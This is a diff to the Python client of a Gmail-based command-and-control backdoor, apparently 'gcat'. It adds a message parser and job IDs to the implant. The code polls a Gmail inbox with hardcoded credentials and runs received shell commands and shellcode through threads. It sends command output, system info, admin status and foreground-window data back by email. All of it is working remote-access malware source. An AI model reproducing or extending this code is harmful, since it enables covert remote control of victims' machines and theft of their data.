@@ -31,7 +31,7 @@ from email import Encoders
 
 #######################################
 gmail_user = 'gcat.test.mofo@gmail.com'
-gmail_pwd = 'gcatmofo123'
+gmail_pwd = 'prettyflypassword'
 server = "smtp.gmail.com"
 server_port = 587
 #######################################
@@ -41,6 +41,25 @@ verbose = True
 
 #generates a unique uuid 
 uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
+
+class msgparser:
+
+    def __init__(self, msg_data):
+        self.getText(msg_data)
+        self.getSubjectHeader(msg_data)
+        self.getDateHeader(msg_data)
+
+    def getText(self, msg_data):
+        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
+            if payload.get_content_maintype() == 'text':
+                self.text = payload.get_payload()
+                self.dict = ast.literal_eval(payload.get_payload())
+
+    def getSubjectHeader(self, msg_data):
+        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
+
+    def getDateHeader(self, msg_data):
+        self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
 def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
@@ -100,22 +119,26 @@ def execShellcode(shellc):
         if verbose == True: print_exc()
         
 
-def execCmd(command):
+def execCmd(command, jobid):
     try:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc.stdout.read()
         stdout_value += proc.stderr.read()
 
-        sendEmail({'CMD': command, 'RES': stdout_value})
+        sendEmail({'CMD': command, 'RES': stdout_value}, jobid=jobid)
     except Exception as e:
         if verbose == True: print_exc()
         pass
 
-def sendEmail(text, attachment=[]):
+def sendEmail(text, jobid='', attachment=[]):
+    sub_header = uniqueid
+    if jobid:
+        sub_header = '{}:{}'.format(uniqueid,jobid)
+
     msg = MIMEMultipart()
-    msg['From'] = uniqueid
+    msg['From'] = sub_header
     msg['To'] = gmail_user
-    msg['Subject'] = uniqueid
+    msg['Subject'] = sub_header
 
     message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': text}
     msg.attach(MIMEText(str(message_content)))
@@ -143,45 +166,29 @@ def sendEmail(text, attachment=[]):
 
 
 def checkJobs():
-    #Here we check the inbox for queued jobs, parse them and send back the results of the commands
+    #Here we check the inbox for queued jobs, parse them and start a thread
 
     while True:
 
         try:
-            c = imaplib.IMAP4_SSL(server) #Connect to server
+            c = imaplib.IMAP4_SSL(server)
             c.login(gmail_user, gmail_pwd)
-            c.select(readonly=1)
-                
+            c.select("INBOX")
+
             typ, id_list_single = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
             typ, id_list_all = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:ALL')")
 
             for id_list in [id_list_single, id_list_all]:
-                
-                commands = None
 
                 for msg_id in id_list[0].split():
 
-                    typ, msg_data = c.uid('fetch', msg_id, '(RFC822)')
-
-                    for response_part in msg_data:
-                        if isinstance(response_part, tuple):
-                            msg = email.message_from_string(response_part[1])
-                            maintype = msg.get_content_maintype()
-                            
-                            if maintype == 'multipart':
-                                for part in msg.get_payload():
-                                    if part.get_content_maintype() == 'text':
-                                        commands = part.get_payload().rstrip("\r\n")
-                            
-                            elif maintype == 'text':
-                                commands = msg.get_payload().rstrip("\r\n")
-
-                    if commands:
-                        c.store(msg_id, '+FLAGS', r'(\Seen)')
-
-                        commands_dict = ast.literal_eval(command)
-                        cmd = commands_dict['CMD']
-                        arg = commands_dict['ARG']
+                    msg_data = c.uid('fetch', msg_id, '(RFC822)')
+                    msg = msgparser(msg_data)
+                    jobid = msg.subject.split(':')[2]
+                    
+                    if msg.dict:
+                        cmd = msg.dict['CMD']
+                        arg = msg.dict['ARG']
 
                         if cmd == 'execshellcode': 
                             t = threading.Thread(name='execshell', target=execShellcode, args=(arg,))
@@ -193,7 +200,7 @@ def checkJobs():
                             t = threading.Thread(name='screenshot', target=screenshot)
                         
                         elif cmd == 'cmd':
-                            t = threading.Thread(name='ExecCmd', target=ExecCmd, args=(arg,))
+                            t = threading.Thread(name='execCmd', target=execCmd, args=(arg,jobid,))
 
                         else:
                             raise NotImplementedError
